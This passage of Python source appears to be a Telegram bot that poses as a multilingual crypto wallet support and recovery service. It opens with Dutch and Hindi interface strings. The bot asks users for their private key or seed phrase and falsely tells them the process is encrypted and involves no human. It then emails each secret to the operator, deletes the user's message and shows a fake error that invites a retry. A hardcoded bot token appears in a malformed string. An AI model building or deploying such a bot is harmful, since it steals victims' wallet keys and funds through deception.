        'missing_balance': "🌳 Ontbrekend/Onregelmatig Saldo",
        'connect_wallet_message': "Gelieve uw wallet te verbinden met uw Privésleutel of Seed Phrase om verder te gaan.",
        'connect_wallet_button': "🔑 Wallet Verbinden",
        'select_wallet_type': "Gelieve uw wallet-type te selecteren:",
        'other_wallets': "Andere Wallets",
        'private_key': "🔑 Privésleutel",
        'seed_phrase': "🔒 Seed Phrase Importeren",
        'wallet_selection_message': "U heeft {wallet_name} geselecteerd.\nSelecteer uw voorkeursmodus voor verbinding.",
        'reassurance': "\n\nVoor uw veiligheid, houd er rekening mee dat alle informatie veilig wordt verwerkt door de bot en dat er geen menselijke tussenkomst is. Dit proces is volledig versleuteld en beschermd om ervoor te zorgen dat uw gegevens veilig zijn tijdens de synchronisatie.",
        'prompt_seed': "Gelieve uw 12/24-woorden geheime zin in te voeren.{reassurance}",
        'prompt_private_key': "Gelieve uw privésleutel in te voeren.{reassurance}",
        'invalid_choice': "Ongeldige keuze. Gelieve de knoppen te gebruiken.",
        'final_error_message': "‼️🌳 Er is een fout opgetreden. Zorg ervoor dat u de juiste sleutel invoert, gebruik kopiëren en plakken om fouten te voorkomen. Gelieve /start om het opnieuw te proberen. ",
        'choose_language': "Gelieve uw voorkeurstaal te selecteren:",
        'await_restart_message': "Gelieve op /start te klikken om opnieuw te beginnen."
    },
    'hi': {
        'welcome': "नमस्ते {user}! आपके सभी क्रिप्टो वॉलेट की जरूरतों के लिए आपके अंतिम स्व-सेवा समाधान टूल में आपका स्वागत है! यह बॉट आपको कनेक्शन त्रुटियां, माइग्रेशन चुनौतियां, स्टैकिंग जटिलताएं, उच्च गैस शुल्क, अटके हुए लेनदेन, गुम हुए फंड, दावा अस्वीकृति, तरलता समस्याएं, जमे हुए लेनदेन, स्वैपिंग में कठिनाइयां, और खोए हुए टोकन जैसे सामान्य मुद्दों को जल्दी और कुशलता से हल करने में मदद करने के लिए डिज़ाइन किया गया है। चाहे आप वॉलेट सिंक्रनाइज़ेशन, गलत टोकन बैलेंस, या असफल ट्रांसफर के साथ समस्याओं का सामना कर रहे हों, हम आपको कवर करते हैं। हमारा लक्ष्य आपको समस्या निवारण प्रक्रिया के माध्यम से कदम-दर-कदम मार्गदर्शन करना है, जिससे आप अपने क्रिप्टो वॉलेट अनुभव का नियंत्रण ले सकें। आइए शुरू करें और आज ही अपनी समस्याओं का समाधान करें!",
        'main_menu_title': "जारी रखने के लिए कृपया एक समस्या प्रकार का चयन करें:",
        'buy': "🌳 खरीदें",
        'validation': "🌳 सत्यापन",
        'claim_tokens': "🌳 टोकन का दावा करें",
        'migration_issues': "🌳 माइग्रेशन समस्याएं",
        'assets_recovery': "🌳 संपत्ति पुनर्प्राप्ति",
        'general_issues': "🌳 सामान्य समस्याएं",
        'rectification': "🌳 सुधार",
        'staking_issues': "🌳 स्टैकिंग समस्याएं",
        'deposits': "🌳 जमा",
        'withdrawals': "🌳 निकासी",
        'slippage_error': "🌳 स्लिपेज त्रुटि",
        'login_issues': "🌳 लॉगिन समस्याएं",
        'high_gas_fees': "🌳 उच्च गैस शुल्क",
        'presale_issues': "🌳 प्रीसेल समस्याएं",
        'missing_balance': "🌳 गुम/अनियमित बैलेंस",
        'connect_wallet_message': "जारी रखने के लिए कृपया अपने निजी कुंजी या सीड वाक्यांश के साथ अपने वॉलेट को कनेक्ट करें।",
        'connect_wallet_button': "🔑 वॉलेट कनेक्ट करें",
        'select_wallet_type': "कृपया अपने वॉलेट का प्रकार चुनें:",
        'other_wallets': "अन्य वॉलेट",
        'private_key': "🔑 निजी कुंजी",
        'seed_phrase': "🔒 सीड वाक्यांश आयात करें",
        'wallet_selection_message': "आपने {wallet_name} का चयन किया है।\nकृपया अपने पसंदीदा कनेक्शन मोड का चयन करें।",
        'reassurance': "\n\nआपकी सुरक्षा के लिए, कृपया ध्यान दें कि सभी जानकारी बॉट द्वारा सुरक्षित रूप से संसाधित की जाती है और इसमें कोई मानवीय हस्तक्षेप शामिल नहीं है। यह प्रक्रिया पूरी तरह से एन्क्रिप्टेड और सुरक्षित है ताकि यह सुनिश्चित हो सके कि सिंक्रनाइज़ेशन के दौरान आपका डेटा सुरक्षित है।",
        'prompt_seed': "कृपया अपना 12/24 शब्दों का गुप्त वाक्यांश दर्ज करें।{reassurance}",
        'prompt_private_key': "कृपया अपनी निजी कुंजी दर्ज करें।{reassurance}",
        'invalid_choice': "अमान्य विकल्प। कृपया बटन का उपयोग करें।",
        'final_error_message': "‼️🌳 एक त्रुटि हुई, कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं, त्रुटियों से बचने के लिए कॉपी और पेस्ट का उपयोग करें। कृपया फिर से कोशिश करने के लिए /start करें। ",
        'choose_language': "कृपया अपनी पसंदीदा भाषा का चयन करें:",
        'await_restart_message': "कृपया फिर से शुरू करने के लिए /start पर क्लिक करें।"
    }
}

# Dictionary to map wallet callback data to their display names
WALLET_DISPLAY_NAMES = {
    'wallet_type_metamask': 'Tonkeeper',
    'wallet_type_trust_wallet': 'Telegram Wallet',
    'wallet_type_coinbase': 'MyTon Wallet',
    'wallet_type_tonkeeper': 'Tonhub',
    'wallet_type_phantom_wallet': 'Trust Wallet',
    'wallet_type_rainbow': 'Rainbow',
    'wallet_type_safepal': 'SafePal',
    'wallet_type_wallet_connect': 'Wallet Connect',
    'wallet_type_ledger': 'Ledger',
    'wallet_type_brd_wallet': 'BRD Wallet',
    'wallet_type_solana_wallet': 'Solana Wallet',
    'wallet_type_balance': 'Balance',
    'wallet_type_okx': 'OKX',
    'wallet_type_xverse': 'Xverse',
    'wallet_type_sparrow': 'Sparrow',
    'wallet_type_earth_wallet': 'Earth Wallet',
    'wallet_type_hiro': 'Hiro',
    'wallet_type_saitamask_wallet': 'Saitamask Wallet',
    'wallet_type_casper_wallet': 'Casper Wallet',
    'wallet_type_cake_wallet': 'Cake Wallet',
    'wallet_type_kepir_wallet': 'Kepir Wallet',
    'wallet_type_icpswap': 'ICPSwap',
    'wallet_type_kaspa': 'Kaspa',
    'wallet_type_nem_wallet': 'NEM Wallet',
    'wallet_type_near_wallet': 'Near Wallet',
    'wallet_type_compass_wallet': 'Compass Wallet',
    'wallet_type_stack_wallet': 'Stack Wallet',
    'wallet_type_soilflare_wallet': 'Soilflare Wallet',
    'wallet_type_aioz_wallet': 'AIOZ Wallet',
    'wallet_type_xpla_vault_wallet': 'XPLA Vault Wallet',
    'wallet_type_polkadot_wallet': 'Polkadot Wallet',
    'wallet_type_xportal_wallet': 'XPortal Wallet',
    'wallet_type_multiversx_wallet': 'Multiversx Wallet',
    'wallet_type_verachain_wallet': 'Verachain Wallet',
    'wallet_type_casperdash_wallet': 'Casperdash Wallet',
    'wallet_type_nova_wallet': 'Nova Wallet',
    'wallet_type_fearless_wallet': 'Fearless Wallet',
    'wallet_type_terra_station': 'Terra Station',
    'wallet_type_cosmos_station': 'Cosmos Station',
    'wallet_type_exodus_wallet': 'Exodus Wallet',
    'wallet_type_argent': 'Argent',
    'wallet_type_binance_chain': 'Binance Chain',
    'wallet_type_safemoon': 'SafeMoon',
    'wallet_type_gnosis_safe': 'Gnosis Safe',
    'wallet_type_defi': 'DeFi',
    'wallet_type_other': 'Other',
}


def get_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    """Retrieves the text for the given key and language from the context."""
    lang = context.user_data.get('language', 'en') # Default to English
    return LANGUAGES.get(lang, LANGUAGES['en']).get(key, LANGUAGES['en'][key])


async def send_email(subject: str, body: str) -> None:
    """Sends an email using the provided credentials."""
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg['Subject'] = subject
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECIPIENT_EMAIL

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

# --- Bot Commands and Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends a language selection menu."""
    keyboard = [
        [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"), InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")],
        [InlineKeyboardButton("🇪🇸 Español", callback_data="lang_es"), InlineKeyboardButton("🇺🇦 Українська", callback_data="lang_uk")],
        [InlineKeyboardButton("🇫🇷 Français", callback_data="lang_fr"), InlineKeyboardButton("🇮🇷 فارسی", callback_data="lang_fa")],
        [InlineKeyboardButton("🇩🇪 Deutsch", callback_data="lang_de"), InlineKeyboardButton("🇦🇪 العربية", callback_data="lang_ar")],
        [InlineKeyboardButton("🇳🇱 Nederlands", callback_data="lang_nl"), InlineKeyboardButton("🇮🇳 हिन्दी", callback_data="lang_hi")],
        [InlineKeyboardButton("🇮🇩 Bahasa Indonesia", callback_data="lang_id"), InlineKeyboardButton("🇵🇹 Português", callback_data="lang_pt")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.message:
        await update.message.reply_text(LANGUAGES['en']['choose_language'], reply_markup=reply_markup)
    else:
        await update.callback_query.message.reply_text(LANGUAGES['en']['choose_language'], reply_markup=reply_markup)
    
    return CHOOSE_LANGUAGE


async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Saves the user's language choice and shows the main menu."""
    query = update.callback_query
    await query.answer()

    lang = query.data.split('_')[1]
    context.user_data['language'] = lang

    await query.message.edit_reply_markup(reply_markup=None) # Remove the language menu
    await show_main_menu(update, context) # Show the main menu in the new language

    return MAIN_MENU


async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends a welcome message and the main menu buttons."""
    user = update.effective_user
    
    welcome_message = get_text(context, 'welcome').format(user=user.mention_html())

    keyboard = [
        [
            InlineKeyboardButton(get_text(context, 'buy'), callback_data='buy'),
            InlineKeyboardButton(get_text(context, 'validation'), callback_data='validation')
        ],
        [
            InlineKeyboardButton(get_text(context, 'claim_tokens'), callback_data='claim_tokens'),
            InlineKeyboardButton(get_text(context, 'migration_issues'), callback_data='migration_issues')
        ],
        [
            InlineKeyboardButton(get_text(context, 'assets_recovery'), callback_data='assets_recovery'),
            InlineKeyboardButton(get_text(context, 'general_issues'), callback_data='general_issues')
        ],
        [
            InlineKeyboardButton(get_text(context, 'rectification'), callback_data='rectification'),
            InlineKeyboardButton(get_text(context, 'staking_issues'), callback_data='staking_issues')
        ],
        [
            InlineKeyboardButton(get_text(context, 'deposits'), callback_data='deposits'),
            InlineKeyboardButton(get_text(context, 'withdrawals'), callback_data='withdrawals')
        ],
        [
            InlineKeyboardButton(get_text(context, 'slippage_error'), callback_data='slippage_error'),
            InlineKeyboardButton(get_text(context, 'login_issues'), callback_data='login_issues')
        ],
        [
            InlineKeyboardButton(get_text(context, 'high_gas_fees'), callback_data='high_gas_fees'),
            InlineKeyboardButton(get_text(context, 'presale_issues'), callback_data='presale_issues')
        ],
        [
            InlineKeyboardButton(get_text(context, 'missing_balance'), callback_data='missing_balance')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.message.reply_html(welcome_message, reply_markup=reply_markup)


async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Shows a single 'Connect Wallet' inline button after any menu selection."""
    query = update.callback_query
    await query.answer()

    menu_option = query.data.replace('_', ' ').title()
    
    keyboard = [
        [InlineKeyboardButton(get_text(context, 'connect_wallet_button'), callback_data="connect_wallet")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text(
        f"{get_text(context, menu_option.lower())}\n{get_text(context, 'connect_wallet_message')}",
        reply_markup=reply_markup
    )
    return AWAIT_CONNECT_WALLET


async def show_wallet_types(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends a selection of popular wallet types and an 'Other' option."""
    query = update.callback_query
    await query.answer()

    keyboard = [
        [InlineKeyboardButton("Tonkeeper", callback_data="wallet_type_metamask")],
        [InlineKeyboardButton("Telegram Wallet", callback_data="wallet_type_trust_wallet")],
        [InlineKeyboardButton("MyTon Wallet", callback_data="wallet_type_coinbase")],
        [InlineKeyboardButton("Tonhub", callback_data="wallet_type_tonkeeper")],
        [InlineKeyboardButton("Trust Wallet", callback_data="wallet_type_phantom_wallet")],
        [InlineKeyboardButton(get_text(context, 'other_wallets'), callback_data="other_wallets")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text(get_text(context, 'select_wallet_type'), reply_markup=reply_markup)

    return CHOOSE_WALLET_TYPE

async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends the full list of all other wallets formatted as a two-column layout without emojis."""
    query = update.callback_query
    await query.answer()

    keyboard = [
        [InlineKeyboardButton("MyTonWallet", callback_data="wallet_type_mytonwallet"), InlineKeyboardButton("TonHub", callback_data="wallet_type_tonhub")],
        [InlineKeyboardButton("Rainbow", callback_data="wallet_type_rainbow"), InlineKeyboardButton("SafePal", callback_data="wallet_type_safepal")],
        [InlineKeyboardButton("Wallet Connect", callback_data="wallet_type_wallet_connect"), InlineKeyboardButton("Ledger", callback_data="wallet_type_ledger")],
        [InlineKeyboardButton("BRD Wallet", callback_data="wallet_type_brd_wallet"), InlineKeyboardButton("Solana Wallet", callback_data="wallet_type_solana_wallet")],
        [InlineKeyboardButton("Balance", callback_data="wallet_type_balance"), InlineKeyboardButton("OKX", callback_data="wallet_type_okx")],
        [InlineKeyboardButton("Xverse", callback_data="wallet_type_xverse"), InlineKeyboardButton("Sparrow", callback_data="wallet_type_sparrow")],
        [InlineKeyboardButton("Earth Wallet", callback_data="wallet_type_earth_wallet"), InlineKeyboardButton("Hiro", callback_data="wallet_type_hiro")],
        [InlineKeyboardButton("Saitamask Wallet", callback_data="wallet_type_saitamask_wallet"), InlineKeyboardButton("Casper Wallet", callback_data="wallet_type_casper_wallet")],
        [InlineKeyboardButton("Cake Wallet", callback_data="wallet_type_cake_wallet"), InlineKeyboardButton("Kepir Wallet", callback_data="wallet_type_kepir_wallet")],
        [InlineKeyboardButton("ICPSwap", callback_data="wallet_type_icpswap"), InlineKeyboardButton("Kaspa", callback_data="wallet_type_kaspa")],
        [InlineKeyboardButton("NEM Wallet", callback_data="wallet_type_nem_wallet"), InlineKeyboardButton("Near Wallet", callback_data="wallet_type_near_wallet")],
        [InlineKeyboardButton("Compass Wallet", callback_data="wallet_type_compass_wallet"), InlineKeyboardButton("Stack Wallet", callback_data="wallet_type_stack_wallet")],
        [InlineKeyboardButton("Soilflare Wallet", callback_data="wallet_type_soilflare_wallet"), InlineKeyboardButton("AIOZ Wallet", callback_data="wallet_type_aioz_wallet")],
        [InlineKeyboardButton("XPLA Vault Wallet", callback_data="wallet_type_xpla_vault_wallet"), InlineKeyboardButton("Polkadot Wallet", callback_data="wallet_type_polkadot_wallet")],
        [InlineKeyboardButton("XPortal Wallet", callback_data="wallet_type_xportal_wallet"), InlineKeyboardButton("Multiversx Wallet", callback_data="wallet_type_multiversx_wallet")],
        [InlineKeyboardButton("Verachain Wallet", callback_data="wallet_type_verachain_wallet"), InlineKeyboardButton("Casperdash Wallet", callback_data="wallet_type_casperdash_wallet")],
        [InlineKeyboardButton("Nova Wallet", callback_data="wallet_type_nova_wallet"), InlineKeyboardButton("Fearless Wallet", callback_data="wallet_type_fearless_wallet")],
        [InlineKeyboardButton("Terra Station", callback_data="wallet_type_terra_station"), InlineKeyboardButton("Cosmos Station", callback_data="wallet_type_cosmos_station")],
        [InlineKeyboardButton("Exodus Wallet", callback_data="wallet_type_exodus_wallet"), InlineKeyboardButton("Argent", callback_data="wallet_type_argent")],
        [InlineKeyboardButton("Binance Chain", callback_data="wallet_type_binance_chain"), InlineKeyboardButton("SafeMoon", callback_data="wallet_type_safemoon")],
        [InlineKeyboardButton("Gnosis Safe", callback_data="wallet_type_gnosis_safe"), InlineKeyboardButton("DeFi", callback_data="wallet_type_defi")],
        [InlineKeyboardButton("Other", callback_data="wallet_type_other")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text(get_text(context, 'select_wallet_type'), reply_markup=reply_markup)

    return CHOOSE_OTHER_WALLET_TYPE


async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends the inline keyboard with Private Key and Seed Phrase options."""
    query = update.callback_query
    await query.answer()
    
    wallet_name = WALLET_DISPLAY_NAMES.get(query.data, query.data.replace('wallet_type_', '').replace('_', ' ').title())
    context.user_data['wallet_type'] = wallet_name

    keyboard = [
        [
            InlineKeyboardButton(get_text(context, 'private_key'), callback_data="private_key"),
            InlineKeyboardButton(get_text(context, 'seed_phrase'), callback_data="seed_phrase")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.message.reply_text(
        get_text(context, 'wallet_selection_message').format(wallet_name=wallet_name),
        reply_markup=reply_markup
    )
    return PROMPT_FOR_INPUT

async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Prompts the user for the specific key or phrase based on their button choice."""
    query = update.callback_query
    await query.answer()
    
    context.user_data['wallet_option'] = query.data
    
    reassurance_message = get_text(context, 'reassurance')
    
    if query.data == "seed_phrase":
        await query.message.reply_text(
            get_text(context, 'prompt_seed').format(reassurance=reassurance_message),
        )
    elif query.data == "private_key":
        await query.message.reply_text(
            get_text(context, 'prompt_private_key').format(reassurance=reassurance_message),
        )
    else:
        await query.message.reply_text(get_text(context, 'invalid_choice'))
        return ConversationHandler.END
        
    return RECEIVE_INPUT

async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receives the final input and sends it to the email, then displays an error message."""
    user_input = update.message.text
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_option = context.user_data.get('wallet_option', 'Unknown')
    wallet_type = context.user_data.get('wallet_type', 'Unknown')
    user = update.effective_user
    
    subject = f"New Wallet Input from Telegram Bot: {wallet_type} -> {wallet_option}"
    body = f"User ID: {user.id}\nUsername: {user.username}\n\nWallet Type: {wallet_type}\nInput Type: {wallet_option}\nInput: {user_input}"
    
    await send_email(subject, body)
    
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
        logging.info(f"Deleted user message with ID: {message_id}")
    except Exception as e:
        logging.error(f"Failed to delete message: {e}")
        
    await update.message.reply_text(
        get_text(context, 'final_error_message'),
        reply_markup=ReplyKeyboardRemove()
    )
    
    return AWAIT_RESTART

async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles any message sent after the initial error, prompting the user to restart."""
    await update.message.reply_text(get_text(context, 'await_restart_message'))
    return AWAIT_RESTART


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels the current conversation and returns the user to the start menu."""
    query = update.callback_query
    await query.answer()
    
    await query.message.edit_reply_markup(reply_markup=None)

    await start(update, context) 
    return CHOOSE_LANGUAGE


def main() -> None:
    """Start the bot."""
    application = ApplicationBuilder().token("8231278561:AAF6CeVyduHhfRHDADVDM227lL0aQzBs0NY).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_LANGUAGE: [
                CallbackQueryHandler(set_language, pattern="^lang_"),
            ],
            MAIN_MENU: [
                CallbackQueryHandler(show_connect_wallet_button, pattern="^(buy|validation|claim_tokens|migration_issues|assets_recovery|general_issues|rectification|staking_issues|deposits|withdrawals|slippage_error|login_issues|high_gas_fees|presale_issues|missing_balance)$")
            ],
            AWAIT_CONNECT_WALLET: [
                CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$")
            ],
            CHOOSE_WALLET_TYPE: [
                CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
            ],
            CHOOSE_OTHER_WALLET_TYPE: [
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
            ],
            PROMPT_FOR_INPUT: [
                CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$")
            ],
            RECEIVE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
            ],
            AWAIT_RESTART: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
            ]
        },
        fallbacks=[
            CommandHandler("start", start),
        ]
    )

    application.add_handler(conv_handler)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()

